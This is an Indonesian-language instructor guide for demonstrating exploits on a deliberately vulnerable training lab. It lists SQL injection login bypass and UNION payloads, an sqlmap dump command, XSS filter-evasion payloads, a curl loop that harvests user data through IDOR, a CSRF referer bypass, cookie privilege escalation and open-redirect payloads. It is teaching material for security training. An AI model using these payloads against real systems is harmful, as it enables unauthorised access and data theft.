# 🛡️ ACT LAB: NATIONAL SEMINAR EXPLOITATION BIBLE
> **SECRET INSTRUCTOR DOCUMENT - DO NOT DISTRIBUTE TO PARTICIPANTS**

Dokumen ini berisi panduan teknis untuk demonstrasi live-exploitation. Fokus pada penggunaan tools Linux (cURL, SQLmap) dan pemahaman akar masalah (Root Cause) pada kode.

---

## 1. SQL Injection: Authentication Bypass
**Target:** `/labs/sqli-login`  
**Goal:** Login sebagai Admin tanpa password.

### 🛠️ Manual Way (Standard)
1. Username: `admin`
2. Password: `' OR '1'='1`

### 🚀 Nyeleneh Payloads (GitHub Style)
Bapak bisa pamer pakai payload yang lebih "keren" ini:
- `admin' #`
- `admin' --`
- `admin' /*`
- `' OR TRUE --`
- `' OR 1=1 LIMIT 1 --`

### 🤖 Automated (cURL)
```bash
curl -X POST http://localhost:3000/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin", "password":"admin'\'' #"}'
```

### 🔍 Root Cause & Impact
**Code:** `SELECT * FROM users WHERE username='${username}' AND password='${password}'`  
**Impact:** Bypass otentikasi total. Celah ini memungkinkan penyerang masuk tanpa password dengan memanipulasi logika logika Boolean SQL.

---

## 2. SQL Injection: UNION Extraction
**Target:** `/labs/sqli-union`  

### 🚀 Nyeleneh Payloads (Advanced)
Kalau `' UNION SELECT ...` sudah biasa, coba tunjukkan cara menebak versi database:
- `' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8 --`
- `' UNION SELECT 1,group_concat(name),3,4,5,6,7,8 FROM sqlite_master --` (Dumping daftar tabel)

### 🤖 Automated (SQLmap Pro)
```bash
# Dumping flag secara spesifik
sqlmap -u "http://localhost:3000/api/search?q=test" --technique=U --dbms=sqlite --dump -C flag
```

---

## 3. XSS Reflected & Stored
**Target:** `/labs/xss-reflected` & `/labs/xss-stored`

### 🛠️ Manual Way (Standard)
`<script>alert(1)</script>`

### 🚀 Nyeleneh Payloads (GitHub "Obscure" Style)
Tunjukkan kalau XSS tidak harus pakai kata `alert` atau tag `script`:
- **SVG Power:** `<svg/onload=prompt(window.origin)>`
- **Image Error:** `<img src=x onerror=confirm(document.domain)>`
- **Details Toggle:** `<details/open/ontoggle=prompt(1)>`
- **Autofocus Hack:** `<input/autofocus/onfocus=alert(1)>`
- **Iframe Srcdoc:** `<iframe/srcdoc="<img src=x onerror=alert(1)>"></iframe>`

### 🔍 Root Cause
Sistem menggunakan `.innerHTML` (Frontend) dan Query SQL mentah (Backend) tanpa sanitasi `DOMPurify` atau `htmlspecialchars`.

---

## 4. Insecure Direct Object Reference (IDOR)
**Target:** `/labs/idor`

### 🚀 Nyeleneh Technique
Bukan cuma ganti ID, tapi tunjukkan cara "Mass Exfiltration" pakai satu baris perintah Linux:
```bash
# Ambil bio dari 20 user pertama secara otomatis
for i in {1..20}; do curl -s "http://localhost:3000/api/profile?id=$i" | grep -oP '"bio":"\K[^"]+'; done
```

---

## 5. Cross-Site Request Forgery (CSRF)
**Target:** `/labs/csrf`

### 🚀 Nyeleneh Bypass
Jelaskan kenapa sistem `referer.includes()` itu sampah. 
Payload domain penyerang: `http://act-lab-csrf-sqli.vercel.app.attacker.com`
Karena mengandung string yang dicari, sistem akan menganggapnya "Official".

---

## 6. Privilege Escalation (Cookie)
**Target:** `/admin`

### 🚀 Manual Hack (Console Way)
Alih-alih lewat menu Inspect, ketik ini di Console (F12) biar kelihatan pro:
```javascript
document.cookie = "role=admin; path=/"; location.reload();
```
Sekejap Navbar akan berubah dan akses Admin terbuka.

---

## 7. Open Redirect
**Target:** `/labs/redirect`

### 🚀 Nyeleneh Payload
Coba pakai skema `//` untuk bypass deteksi `http`:
- `/api/redirect?url=//google.com`
- `/api/redirect?url=/\evil.com`
- `/api/redirect?url=https:google.com` (Beberapa browser akan menganggap ini valid)
